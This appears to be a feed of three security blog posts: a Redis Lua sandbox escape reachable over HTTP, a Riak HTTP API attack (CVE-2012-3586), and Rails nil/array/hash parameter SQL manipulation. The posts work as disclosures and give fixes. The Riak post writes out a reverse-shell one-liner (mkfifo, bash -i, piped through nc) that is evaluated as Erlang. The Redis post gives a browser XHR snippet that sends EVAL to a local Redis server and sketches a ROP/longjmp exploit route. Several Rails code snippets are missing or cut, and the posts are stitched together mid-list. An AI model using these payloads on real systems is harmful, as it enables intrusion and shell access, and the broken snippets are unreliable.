    <content type="html"><![CDATA[<p>It is possible to break out of the Lua sandbox in Redis and execute arbitrary
code. This vulnerability is not new and is heavily based on
<a href="https://www.youtube.com/watch?v=OSMOTDLrBCQ">Peter Cawley&#8217;s work</a> with Lua bytecode
<a href="https://gist.github.com/corsix/6575486">type confusion</a>.</p>

<p>This shouldn&#8217;t pose a threat to users under the trusted Redis security model
where only trusted users can connect to the database. However, in real
deployments there could be databases that can be accessed by untrusted users.
The main deployments that are vulnerable are developers machines, places where
redis servers can be reached via SSRF attacks and cloud hosting.</p>

<h1>Vulnerable Deployments</h1>

<h2>Developers Machines</h2>

<p>Developers machines may be vulnerable because they bind Redis to all interfaces
which used to be the default listen directive in the Redis configuration.</p>

<p>Developers may also be vulnerable even if they bind to 127.0.0.1 because Redis
is effectively a HTTP server. The first mention of attacking Redis via HTTP I
could find is by <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Nicolas Grégoire</a>
where he documents attacking a Redis server on a Facebook property using a SSRF
vulnerability.</p>

<p>Because Redis is a HTTP server the same origin policies of browsers will allow
any website on the internet to send a POST request to it. When using XHR the
body is completely controllable. For example if you run the following in the
console of your webbrowser while running wireshark:</p>

<pre><code>var x = new XMLHttpRequest();
x.open("POST", "http://127.0.0.1:6379");
x.send('eval "print(\\"hello\\")" 0\r\n');
</code></pre>

<p>In wireshark you will see:</p>

<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:6379
Connection: keep-alive
Content-Length: 27
Pragma: no-cache
Cache-Control: no-cache

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36

eval "print(\"hello\")" 0
-ERR unknown command 'POST'

-ERR unknown command 'Content-Type:'
-ERR unknown command 'Accept:'

$-1
</code></pre>

<p>And in the stdout for Redis you will see:</p>

<pre><code>hello
</code></pre>

<p>The attacker is not able to read the response from the server because of the
same origin policy. However, this might be worked around by using a <a href="https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/">DNS rebinding attack</a>.
Even with DNS rebinding it might not be possible to read the response because
the response is not valid HTTP.</p>

<p>However, reading the response is not necessary because you can package a super generic
exploit that checks the result of the redis.call(&#8220;INFO&#8221;) command and then
launches a OS/architecture specific payload.</p>

<h2>SSRF attacks</h2>

<p>This is similar to attacking developers except a trusted server is tricked into
making a request to the Redis server However, you need a lot of control over
the body which might not often be possible depending on how the body is encoded.</p>

<h2>Redis Cloud Hosting</h2>

<p>This will only effect providers where people running arbitrary code from the
Redis process is not part of their threat model. The major players in this area
look like they are using sandboxing. For example the pids returned by &#8216;INFO&#8217; on
heroku are very low &lt;10 which indicates they are running the Redis servers in
containers. You can already run arbitrary code in containers via dynos on Heroku
so running arbitrary code in a Redis container is probably not useful for an
attacker. Amazon Elasticcache also looks like it uses linux containers.</p>

<p>Similarily, it looks like Microsoft&#8217;s hosted Redis solution runs in an
isolated VM. Redis &#8216;INFO&#8217; returns a virtual os string and it takes ~15
minutes to launch an instance. If MS aren&#8217;t running in an isolated VM then the
15 minute startup time is very weird.</p>

<p>This will be a problem if a hosting provider runs a whole bunch of redis
processes on the same machine/same VM from different customers without any
kind of isolation.</p>

<h1>Exploit</h1>

<p><a href="https://gist.github.com/corsix/6575486">Peter Cawley</a> has found that the
loadstring function can be used to load bytecode that is unsafe. He has
created three very useful lua exploit primitives that make exploitation easy.</p>

<p>First is a way of reading the Value contained in a TValue struct. This allows
reading the pointer value from a lua tagged value. Some pointer values are
already public (using tostring) but there doesn&#8217;t seem to be a way to get the
pointer value for a lua string so this is useful.</p>

<p>Second is a way of reading 8 bytes from an arbitrary memory address.</p>

<p>Third is a way of writing 8 bytes to an arbitrary memory address.</p>

<p>Using the arbitrary memory read it is possible to leak the address of a known
C function. From the address of this c-function it is possible to find the base
address of the redis-server binary. From this base address it is possible to
find pointers to libc/libsystem_c functions and to find the base address of the
libc/libsystem_c libraries. From these libraries it is possible to find the
addresses of useful exported functions (longjump/system) and ROP gadgets. This
technique is similar to pwntools <a href="http://pwntools.readthedocs.org/en/latest/dynelf.html">dynelf</a></p>

<p>The arbitrary memory read is also used to leak an address inside the stack. The
lua_State object holds a long_jump variable that references a long_jump buffer
that is allocated on the stack. This leaks the stack address which can be useful
if you just want to corrupt the stack or the rsp and rip can be overwritten in
the longjump buf to directly take control when longjump is called. OSX has no
pointer mangling protections so this is quite easy to corrupt.</p>

<p>On linux the rip and rsp (and rbp) values are mangled. However, if you have full
read access to the memory you can reverse the secret cookie value to corrupt
the values. Also, linux prevents you from longjmp&#8217;ing to an invalid stack frame
(ie: the heap) but you can longjump to point the stack inside the longjump
buffer then pivot the stack into the heap. This is not really necessary if you
don&#8217;t care about corrupting the stack and crashing the redis process but if you
longjump and don&#8217;t corrupt the stack then you can resume normal execution of
redis after the exploit has finished running.</p>

<h1>Exploitability</h1>

<p>I have exploits for Linux 64 bit and OSX 64 bit. Both exploits take care to not
crash the redis server during successful execution. They will make a call to
system() then go back to normal redis execution.</p>

<p>I have run the Linux exploit on the Amazon RHEL Image (PIE enabled) and the
Amazon 14.04 Ubuntu Image (no PIE). I believe the exploit will work on most
modern Linux 64 bit systems (I suspect it will not work if you compile libc with
 fomit-frame-pointer but this can be worked around). It does not use any
hardcoded addresses from libc or the Redis binary.</p>

<p>The OSX version I have only tested on Yosemite but an earlier version was
working on Mavericks and I believe the Yosemite version works on both. This has
been tested with two different Redis versions and similarily does not depend on
hardcoded address from libsystem_c or the Redis binary. However, it uses
addresses from libsystem_c to speed up the exploit.</p>

<h1>Workarounds</h1>

<p>The best option is to set a strong password on Redis. Systems that are reachable
via HTTP without a password are a problem waiting to happen.</p>

<p>It is also possible to rename the EVAL command. If you are not using EVAL this
is a good option but you still might be at risk of someone modifying your Redis
data via HTTP SSRF attacks.</p>

    <content type="html"><![CDATA[<h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>

<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>

<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>

<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>

<p>The attack will perform the following actions</p>

<ol>
<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>

    <content type="html"><![CDATA[<p>Most Rails applications don&#8217;t properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I&#8217;m going to use an example to illustrate this problem.</p>

<h2>The Scenario</h2>

<p>Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like <code>/users/1/passwords/edit?reset_token=kjksldjflskdjf</code>. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>

</span><span class='line'>

</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url <code>/users/2/passwords/edit</code> and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.</p>

<p>Johnny reproduces the problem on his machine and notices it is is doing the following query:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">reset_token</span><span class="sb">` IS NULL LIMIT 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>He realises he needs to stop users from not sending the reset_token parameter because if <code>params[:reset_token]</code> is <code>nil</code> then they can update any user who hasn&#8217;t requested a password reset. He updates the code in PasswordController to the following:</p>

</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Mary tries her trick again but it doesn&#8217;t work this time. But Mary has more tricks in her bag and this time she uses the url <code>/users/2/passwords/edit?reset_token[]</code> . Again she is able to change the password for any user that has not had a reset_token generated.</p>

<p>Johnny reproduces the problem on his machine and sees it doing the same query:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span></code></pre></td></tr></table></div></figure>


<p>Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the <code>params[:reset_token]</code> is actually an array containing a nil element: <code>[nil]</code>. He decides to fix the problem by calling <code>to_s</code> on the query parameters.</p>

<h2>Not Just Arrays (SQL Manipulation)</h2>

<p>For example Mary could of sent the url <code>/users/2/passwords/edit?reset_token[users.id]=2</code>. The query then performed would have been:</p>

<p>The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
to arbitrary SQL injection. This attack uses the <a href="https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b">previously fixed issue</a> of SQL injection in table names and columns. This bug was originally not
as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
attacker is now able to change table and column names to perform SQL injection.</p>

<p>This <code>Hash</code> problem is actually a security bug in rails and the rails team has released a patch for it.</p>

<h2>Underlying Problem</h2>

<p>The problem is developers expect the user input to be a <code>String</code> but it can also be an <code>Array</code> or a <code>Hash</code> and Rails has quite different behaviour if a <code>Hash</code> or an <code>Array</code> is passed in. The <code>Hash</code> is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:</p>

<h2>Vulnerable Code</h2>

<ul>
<li>https://github.com/thoughtbot/clearance - Possible to change any users password.</li>
<li>Rails ( 2.3.x, &lt; 3.2.6, &lt;3.1.6, &lt; 3.0.14) SQL manipulation/SQL injection anywhere there is use of <code>where()</code> or <code>find()</code> that takes user input.</li>
</ul>


<h2>Fixes</h2>

<ul>
<li>Rails has <a href="http://weblog.rubyonrails.org/2012/6/12/ann-rails-3-2-6-has-been-released/">released 3.2.6</a> that fixes both the nil issue and SQL manipulation/injection problems with <code>Hash</code>.</li>
<li>Clearance has released a new version <a href="http://robots.thoughtbot.com/post/24197949040/clearance-0-16-3-fixes-a-password-reset-vulnerability">0.6.13</a> which fixes the problem with nil parameters</li>
</ul>


<h2>Mitigation</h2>

<p>It is recommended that you install the Rails patches to fix the <code>Hash</code> problem and nil problem. Also, with security sensitive code I strongly recommend all query
parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a <code>String</code> you should call <code>to_s</code> on it.</p>

<h2>Previous Work</h2>

<p>The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a <code>ParamFilter</code>
class that forces all parameters to be <code>String</code>s. It looks like they did this because they had an injection problem with mongoid.</p>

<h2>Stay Tuned</h2>

<p>We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the <code>Hash</code> attack that was fixed in 3.2.6. I will cover
that in a future article and show how to exploit it.</p>
